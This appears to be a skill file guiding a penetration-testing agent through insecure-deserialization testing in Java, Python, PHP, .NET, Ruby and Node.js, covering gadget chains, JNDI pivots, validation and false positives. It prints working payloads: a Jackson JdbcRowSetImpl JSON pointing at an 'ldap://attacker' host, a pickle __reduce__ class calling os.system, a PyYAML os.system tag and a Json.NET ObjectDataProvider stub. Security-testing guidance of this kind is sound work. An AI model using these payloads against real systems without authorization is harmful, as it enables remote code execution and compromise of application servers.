---
name: insecure-deserialization
description: Insecure deserialization testing for Java, Python, PHP, .NET, Ruby, and Node.js covering gadget chains, type confusion, and safe validation
---

# Insecure Deserialization

Insecure deserialization passes attacker-controlled byte streams or structured blobs to language-native unmarshal functions, enabling remote code execution, authentication bypass, and logic manipulation through magic methods and gadget chains. Test any endpoint accepting serialized objects, session blobs, or opaque binary tokens.

## Attack Surface

**Formats**
- Java: Java native serialization, XStream, JSON → object mappers (Jackson, Fastjson), YAML (SnakeYAML), Hessian/Burlap, Kryo
- Python: `pickle`, `yaml.load` (unsafe), `marshal`, shelve
- PHP: `unserialize()`, Phar deserialization
- .NET: `BinaryFormatter`, `Json.NET TypeNameHandling`, ViewState
- Ruby: `Marshal.load`, YAML.load
- Node.js: `node-serialize`, `unserialize.js` (less common; see prototype_pollution for merge bugs)

**Transports and Containers**
- Java RMI/JMX, HTTP/RPC endpoints, messaging protocols, queues, signed wrappers, and product-specific binary envelopes can carry one or more formats above

**Input Locations**
- Cookies, session tokens, hidden form fields
- API parameters (`data`, `state`, `object`, base64 blobs)
- Message queues, WebSocket binary frames, file uploads
- Cache entries, database columns storing serialized objects

## Key Vulnerabilities

### Java Deserialization

**Gadget Chains**
- Commons Collections, Commons BeanUtils, Spring, Groovy, Rome, JDK-only chains (varies by classpath)
- Tools: ysoserial (authorized testing only), manual chain selection by classpath

**Test Flow**
1. Confirm deserialization sink (HTTP param, cookie, RMI, JMX if exposed)
2. Fingerprint library versions from errors, headers, or bundled libs
3. Generate gadget payload for available chain; expect DNS/HTTP callback or command execution

**Jackson / JSON Typing**
```json
["com.sun.rowset.JdbcRowSetImpl", {"dataSourceName":"ldap://attacker/o", "autoCommit":true}]
```
When `enableDefaultTyping` or `@JsonTypeInfo` allows attacker-chosen types.

**JNDI Pivots from Object Construction**

JNDI injection is not itself a serialization format. It becomes part of this workflow when an attacker-selected type, setter, or gadget performs `Context.lookup()` during object construction or property population. `JdbcRowSetImpl` and some historical polymorphic JSON chains are examples; Log4j lookups reach JNDI through a different input path and should not be classified as deserialization.

- Trace fields such as `dataSourceName`, `jndiName`, and `namingURL` into the exact lookup API and provider.
- Record the accepted schemes/provider factories (`ldap`, `ldaps`, `rmi`, DNS URL context, or application-specific naming providers). A `dns://` value is not a universal oracle; it works only when the relevant DNS provider and lookup path are present.
- Separate network lookup, remote object/reference processing, serialized LDAP attributes, remote codebase loading, and local object-factory invocation. Each is a different capability with different runtime controls.
- JEP 290 filters incoming Java serialization graphs; it does not disable JNDI remote codebase loading. JNDI providers gained separate remote-class-loading and serialized-data controls across JDK updates, and current JDKs disable remote code downloading by default. Record the exact JDK build and relevant provider properties instead of using a single “modern Java” rule.
- When remote class loading is unavailable, test whether the returned reference can reach a compatible **local** `ObjectFactory`, bean-property path, expression engine, script engine, or other class already present. Confirm exact class names, versions, module access, and trigger methods from the deployed classpath.

**Hessian / Burlap**
- Binary RPC formats deserialized by `HessianInput`/`Hessian2Input`. Attacker object graphs reach gadgets even though it is not native Java serialization.
- Treat serializer version, allowed type metadata, constructors/setters invoked, collection/comparator behavior, and classpath as independent prerequisites.
- Pair `semantic_confusion` when a proxy or route policy is expected to make the RPC endpoint unreachable.
- Inspect the exact deployed libraries rather than relying on generic gadget labels; similar-looking Spring, Resin, Tomcat, XBean, EL, or Groovy classes are not interchangeable.

### Python Pickle

Pickle executes arbitrary code during unpickling by design:
```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))

# base64 encode pickle.dumps(Exploit()) and send as cookie/param
```

**YAML**
```yaml
!!python/object/apply:os.system ['id']
```
When `yaml.load` used instead of `yaml.safe_load`.

### PHP unserialize()

**Object Injection**
- Magic methods: `__wakeup`, `__destruct`, `__toString`, `__call`
- POP chains through framework classes (Laravel, Symfony, WordPress plugins)

**Phar Deserialization**
- Upload or reference `phar://` wrapper triggering metadata deserialization on file operations

### .NET Deserialization

**BinaryFormatter / LosFormatter**
- Never safe on untrusted input; full RCE with known gadget chains (ysoserial.net)

**Json.NET**
```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework", ...}
```
When `TypeNameHandling` != `None`.

**ViewState**
- MAC disabled or weak machine keys → forge deserialized view state

### Ruby Marshal

- `Marshal.load` on user input → gadget chains in Rails/Devise versions (context-dependent)

## Validation

1. Demonstrate attacker-controlled object graph reaches dangerous sink (unmarshal/readObject)
2. Show impact: RCE (bounded command), auth bypass object, or privilege field manipulation
3. Provide encoded payload and exact injection point (cookie name, parameter, header)
4. Confirm on fixed version or alternate instance that identical payload fails safely
5. Document library/version and gadget chain class names for remediation

## False Positives

- Base64 data is encrypted or signed with verified HMAC before deserialization
- Only primitive types deserialized (whitelist schema, no polymorphic types)
- `pickle`/`Marshal` not used; JSON parsed to dict without object instantiation
- Deserialization in isolated sandbox with no network/exec primitives (verify thoroughly)
- Error mentions serialization class but input is never passed to unmarshal (dead code path)

## Impact

- Remote code execution on application servers
- Authentication bypass via forged session objects
- Privilege escalation through manipulated role/admin fields in deserialized classes
- Full application compromise in Java/PHP/.NET stacks with known gadget libraries

## Pro Tips

1. Always fingerprint versions before firing ysoserial — wrong chain wastes time and noise
2. Start with DNS/HTTP callback gadgets before command execution in production-like targets
3. Check cookies named `JSESSIONID` alternatives, `.ASPXAUTH`, `laravel_session`, custom tokens
4. In white-box, trace from `readObject`/`unserialize`/`pickle.loads` backward to source
5. ViewState MAC off is still common on legacy ASP.NET — test early on `.aspx` apps
6. Model JNDI lookup, reference/object processing, remote codebase loading, and local factory invocation as separate stages
7. A "blocked" enterprise deserialization endpoint may still be reachable through a proxy/path-normalization mismatch — pair `semantic_confusion`

## Summary

Treat every deserialization of untrusted data as critical. Safe patterns use JSON schema validation without type polymorphism, `yaml.safe_load`, signed encrypted tokens, or no custom serialization at all. Prove impact with callback or bounded execution — not just error stack traces.
